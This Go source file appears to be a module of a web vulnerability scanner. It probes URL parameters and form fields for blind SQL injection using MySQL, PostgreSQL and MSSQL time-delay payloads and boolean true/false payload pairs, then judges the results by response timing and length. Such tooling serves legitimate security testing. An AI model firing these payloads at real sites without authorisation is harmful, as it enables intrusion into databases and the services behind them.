package modules

import (
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/SentinelXofficial/sxel/internal/output"
	"github.com/SentinelXofficial/sxel/pkg/core"
)

type timeTpl struct {
	payload      string
	sleep        int
	confirm      string
	confirmSleep int
	db           string
}

func timeTemplates() []timeTpl {
	return []timeTpl{
		{"1' AND (SELECT * FROM (SELECT(SLEEP(3)))x)-- ", 3, "1' AND (SELECT * FROM (SELECT(SLEEP(5)))x)-- ", 5, "MySQL"},
		{"'and(select*from(select+sleep(3))a)='", 3, "'and(select*from(select+sleep(5))a)='", 5, "MySQL"},
		{"' AND SLEEP(3)-- ", 3, "' AND SLEEP(5)-- ", 5, "MySQL"},
		{"1 AND SLEEP(3)", 3, "1 AND SLEEP(5)", 5, "MySQL"},
		{"\" AND SLEEP(3)-- ", 3, "\" AND SLEEP(5)-- ", 5, "MySQL"},
		{"' OR SLEEP(3)-- ", 3, "' OR SLEEP(5)-- ", 5, "MySQL"},
		{"'; SELECT pg_sleep(3)-- ", 3, "'; SELECT pg_sleep(5)-- ", 5, "PostgreSQL"},
		{"' AND 1=(SELECT 1 FROM PG_SLEEP(3))-- ", 3, "' AND 1=(SELECT 1 FROM PG_SLEEP(5))-- ", 5, "PostgreSQL"},
		{"'; WAITFOR DELAY '0:0:3'-- ", 3, "'; WAITFOR DELAY '0:0:5'-- ", 5, "MSSQL"},
		{"1; WAITFOR DELAY '0:0:3'-- ", 3, "1; WAITFOR DELAY '0:0:5'-- ", 5, "MSSQL"},
	}
}

func sampleURLTime(client *http.Client, cfg *core.Config, rawURL string, n int) time.Duration {
	var samples []time.Duration
	for i := 0; i < n; i++ {
		t0 := time.Now()
		core.DoGET(client, cfg, rawURL)
		samples = append(samples, time.Since(t0))
	}
	return medianDuration(samples)
}

func marginFor(cfg *core.Config, sleep int) time.Duration {
	f := cfg.SQLiMarginFactor
	if f <= 0 || f > 1 {
		f = 0.85
	}
	return time.Duration(float64(sleep) * float64(time.Second) * f)
}

func confirmed(cfg *core.Config, firstDelta, confirmDelta time.Duration, confirmSleep int) bool {
	if firstDelta <= 0 {
		return false
	}
	f := cfg.SQLiConfirmFactor
	if f <= 0 || f > 1 {
		f = 0.8
	}
	needed := time.Duration(float64(confirmSleep) * float64(time.Second) * f)
	if confirmDelta >= needed {
		return true
	}
	return confirmDelta >= 3*firstDelta/2
}

func scanTimeURL(client *http.Client, cfg *core.Config, targetURL, param string) []core.ScanResult {
	safe, _ := core.SetParam(targetURL, param, "1")
	base := sampleURLTime(client, cfg, safe, 3)
	for _, tp := range timeTemplates() {
		testURL, _ := core.SetParam(targetURL, param, tp.payload)
		quick := sampleURLTime(client, cfg, testURL, 2) - base
		if quick < marginFor(cfg, tp.sleep) {
			if cfg.Verbose {
				output.Verbose("[sqli-time] %s param=%s quick_check miss (%v < %v)", tp.db, param, quick.Round(time.Millisecond), marginFor(cfg, tp.sleep).Round(time.Millisecond))
			}
			continue
		}
		confURL, _ := core.SetParam(targetURL, param, tp.confirm)
		verify := sampleURLTime(client, cfg, confURL, 2) - base
		if !confirmed(cfg, quick, verify, tp.confirmSleep) {
			if cfg.Verbose {
				output.Verbose("[sqli-time] %s param=%s verify failed: quick %v, verify %v", tp.db, param, quick.Round(time.Millisecond), verify.Round(time.Millisecond))
			}
			continue
		}
		return []core.ScanResult{{
			Type: fmt.Sprintf("SQL Injection Time-Based Blind [%s]", tp.db),
			URL:  testURL, Method: "GET", Parameter: param,
			Payload:  fmt.Sprintf("%s | confirm: %s", tp.payload, tp.confirm),
			Severity: "HIGH",
			Evidence: fmt.Sprintf("baseline %v; quick_check %v (sleep %d, margin %v); verified %v (sleep %d)",
				base.Round(time.Millisecond), quick.Round(time.Millisecond), tp.sleep,
				marginFor(cfg, tp.sleep).Round(time.Millisecond), verify.Round(time.Millisecond), tp.confirmSleep),
			Timestamp: time.Now(),
		}}
	}
	return nil
}

func scanTimeForm(client *http.Client, cfg *core.Config, form core.Form, input string) []core.ScanResult {
	var baseSamples []time.Duration
	for i := 0; i < 2; i++ {
		t0 := time.Now()
		if form.Method == "POST" {
			core.DoPOST(client, cfg, form.Action, core.FormDefaults(form))
		} else {
			u, _ := core.SetFormParams(form.Action, core.FormDefaults(form))
			core.DoGET(client, cfg, u)
		}
		baseSamples = append(baseSamples, time.Since(t0))
	}
	base := medianDuration(baseSamples)

	for _, tp := range timeTemplates() {
		d := core.FormDefaults(form)
		d.Set(input, tp.payload)
		t0 := time.Now()
		if form.Method == "POST" {
			core.DoPOST(client, cfg, form.Action, d)
		} else {
			u, _ := core.SetFormParams(form.Action, d)
			core.DoGET(client, cfg, u)
		}
		quick := time.Since(t0) - base
		if quick < marginFor(cfg, tp.sleep) {
			continue
		}
		dc := core.FormDefaults(form)
		dc.Set(input, tp.confirm)
		var verifySamples []time.Duration
		ok := true
		for i := 0; i < 2; i++ {
			t0 := time.Now()
			var err error
			if form.Method == "POST" {
				_, _, err = core.DoPOST(client, cfg, form.Action, dc)
			} else {
				u, _ := core.SetFormParams(form.Action, dc)
				_, _, err = core.DoGET(client, cfg, u)
			}
			if err != nil {
				ok = false
				break
			}
			verifySamples = append(verifySamples, time.Since(t0))
		}
		if !ok {
			continue
		}
		verify := medianDuration(verifySamples) - base
		if !confirmed(cfg, quick, verify, tp.confirmSleep) {
			if cfg.Verbose {
				output.Verbose("[sqli-time-form] %s input=%s verify failed: quick %v, verify %v", tp.db, input, quick.Round(time.Millisecond), verify.Round(time.Millisecond))
			}
			continue
		}
		return []core.ScanResult{{
			Type: fmt.Sprintf("SQL Injection Time-Based Blind via Form [%s]", tp.db),
			URL:  form.Action, Method: form.Method, Parameter: input,
			Payload:  fmt.Sprintf("%s | confirm: %s", tp.payload, tp.confirm),
			Severity: "HIGH",
			Evidence: fmt.Sprintf("baseline %v; quick_check %v (sleep %d, margin %v); verified %v (sleep %d)",
				base.Round(time.Millisecond), quick.Round(time.Millisecond), tp.sleep,
				marginFor(cfg, tp.sleep).Round(time.Millisecond), verify.Round(time.Millisecond), tp.confirmSleep),
			Timestamp: time.Now(),
		}}
	}
	return nil
}

func ScanBlindSQLiTime(client *http.Client, cfg *core.Config, target core.CrawlResult) []core.ScanResult {
	var results []core.ScanResult

	var params url.Values
	p, err := url.Parse(target.URL)
	if err == nil {
		params, _ = url.ParseQuery(p.RawQuery)
	} else {
		params = url.Values{}
	}
	for param := range params {
		found := scanTimeURL(client, cfg, target.URL, param)
		if len(found) > 0 {
			results = append(results, found...)
			output.Warn("Time-Based SQLi: param=%s [%s]", param, found[0].Type)
		}
	}

	for _, form := range target.Forms {
		for _, inp := range form.Inputs {
			found := scanTimeForm(client, cfg, form, inp.Name)
			if len(found) > 0 {
				results = append(results, found...)
				output.Warn("Time-Based SQLi (Form): %s input=%s [%s]", form.Action, inp.Name, found[0].Type)
			}
		}
	}
	return results
}

type booleanPair struct {
	trueP  string
	falseP string
}

func booleanPairs() []booleanPair {
	return []booleanPair{
		{"' OR 1=1-- ", "' OR 1=2-- "},
		{"' AND 1=1-- ", "' AND 1=2-- "},
		{"1 AND 1=1", "1 AND 1=2"},
		{"' OR 'a'='a", "' OR 'a'='b"},
		{"1' AND '1'='1", "1' AND '1'='2"},
	}
}

type boolSplit struct {
	diff        int
	significant bool
	falseLen    int
	falseStatus int
}

func consistentClassSplit(splits []boolSplit) bool {
	var sig []int
	for _, s := range splits {
		if s.significant {
			sig = append(sig, s.diff)
		}
	}
	if len(sig) < 2 {
		return false
	}
	for _, d := range sig[1:] {
		if (d > 0) != (sig[0] > 0) {
			return false
		}
	}
	return true
}

func baselineFalseConfirmed(bl core.BaselineResult, splits []boolSplit) bool {
	confirmed := 0
	for _, s := range splits {
		falseLenDiff := s.falseLen - bl.Length
		if falseLenDiff < 0 {
			falseLenDiff = -falseLenDiff
		}
		if (bl.Status == 0 || s.falseStatus == bl.Status) && falseLenDiff <= 100 {
			confirmed++
		}
	}
	return confirmed >= 2
}

func scanBooleanURL(client *http.Client, cfg *core.Config, targetURL, param string, bl core.BaselineResult) []core.ScanResult {
	var results []core.ScanResult
	if !bl.Valid {
		return nil
	}
	var splits []boolSplit
	var evidence []string
	lastURL := targetURL
	for _, pr := range booleanPairs() {
		urlTrue, _ := core.SetParam(targetURL, param, pr.trueP)
		urlFalse, _ := core.SetParam(targetURL, param, pr.falseP)
		lastURL = urlTrue
		bodyTrue, statusTrue, err := core.DoGET(client, cfg, urlTrue)
		if err != nil {
			continue
		}
		bodyFalse, statusFalse, err := core.DoGET(client, cfg, urlFalse)
		if err != nil {
			continue
		}
		if hasRateLimitOrError(bodyTrue) || hasRateLimitOrError(bodyFalse) {
			continue
		}
		diff := len(bodyTrue) - len(bodyFalse)
		splits = append(splits, boolSplit{diff: diff, significant: diff > 100 || diff < -100 || statusTrue != statusFalse, falseLen: len(bodyFalse), falseStatus: statusFalse})
		evidence = append(evidence, fmt.Sprintf("pair(%s | %s): %+d bytes, HTTP %d/%d", pr.trueP, pr.falseP, diff, statusTrue, statusFalse))
	}
	if consistentClassSplit(splits) && baselineFalseConfirmed(bl, splits) {
		results = append(results, core.ScanResult{
			Type: "SQL Injection Boolean-Based Blind",
			URL:  lastURL, Method: "GET", Parameter: param,
			Payload:   "TRUE vs FALSE class split",
			Severity:  "HIGH",
			Evidence:  fmt.Sprintf("multi-pair class split confirmed (baseline HTTP %d, %d bytes): %s", bl.Status, bl.Length, strings.Join(evidence, "; ")),
			Timestamp: time.Now(),
		})
		output.Warn("Boolean-Based SQLi: param=%s", param)
	}
	return results
}

func scanBooleanForm(client *http.Client, cfg *core.Config, form core.Form, input string, bl core.BaselineResult) []core.ScanResult {
	var results []core.ScanResult
	if !bl.Valid {
		return nil
	}
	var splits []boolSplit
	var evidence []string
	for _, pr := range booleanPairs() {
		dTrue := core.FormDefaults(form)
		dTrue.Set(input, pr.trueP)
		dFalse := core.FormDefaults(form)
		dFalse.Set(input, pr.falseP)

		var bodyTrue, bodyFalse string
		var statusTrue, statusFalse int
		var err error
		if form.Method == "POST" {
			bodyTrue, statusTrue, err = core.DoPOST(client, cfg, form.Action, dTrue)
			if err != nil {
				continue
			}
			bodyFalse, statusFalse, err = core.DoPOST(client, cfg, form.Action, dFalse)
			if err != nil {
				continue
			}
		} else {
			uTrue, _ := core.SetFormParams(form.Action, dTrue)
			uFalse, _ := core.SetFormParams(form.Action, dFalse)
			bodyTrue, statusTrue, err = core.DoGET(client, cfg, uTrue)
			if err != nil {
				continue
			}
			bodyFalse, statusFalse, err = core.DoGET(client, cfg, uFalse)
			if err != nil {
				continue
			}
		}
		if hasRateLimitOrError(bodyTrue) || hasRateLimitOrError(bodyFalse) {
			continue
		}
		diff := len(bodyTrue) - len(bodyFalse)
		splits = append(splits, boolSplit{diff: diff, significant: diff > 100 || diff < -100 || statusTrue != statusFalse, falseLen: len(bodyFalse), falseStatus: statusFalse})
		evidence = append(evidence, fmt.Sprintf("pair(%s | %s): %+d bytes, HTTP %d/%d", pr.trueP, pr.falseP, diff, statusTrue, statusFalse))
	}
	if consistentClassSplit(splits) && baselineFalseConfirmed(bl, splits) {
		results = append(results, core.ScanResult{
			Type: "SQL Injection Boolean-Based Blind via Form",
			URL:  form.Action, Method: form.Method, Parameter: input,
			Payload:   "TRUE vs FALSE class split",
			Severity:  "HIGH",
			Evidence:  fmt.Sprintf("multi-pair class split confirmed (baseline HTTP %d, %d bytes): %s", bl.Status, bl.Length, strings.Join(evidence, "; ")),
			Timestamp: time.Now(),
		})
		output.Warn("Boolean-Based SQLi (Form): %s input=%s", form.Action, input)
	}
	return results
}

func ScanBooleanBlindSQLi(client *http.Client, cfg *core.Config, target core.CrawlResult) []core.ScanResult {
	var results []core.ScanResult

	var params url.Values
	p, err := url.Parse(target.URL)
	if err == nil {
		params, _ = url.ParseQuery(p.RawQuery)
	} else {
		params = url.Values{}
	}
	for param := range params {
		bl := FetchBaseline(client, cfg, target.URL, param)
		results = append(results, scanBooleanURL(client, cfg, target.URL, param, bl)...)
	}

	for _, form := range target.Forms {
		bl := FetchFormBaseline(client, cfg, form)
		for _, inp := range form.Inputs {
			results = append(results, scanBooleanForm(client, cfg, form, inp.Name, bl)...)
		}
	}
	return results
}

func hasRateLimitOrError(body string) bool {
	low := strings.ToLower(body)
	indicators := []string{
		"rate limit exceeded", "too many request", "access denied",
		"temporarily blocked", "captcha required", "service unavailable",
		"request blocked by firewall", "mod_security",
	}
	for _, ind := range indicators {
		if strings.Contains(low, ind) {
			return true
		}
	}
	return false
}
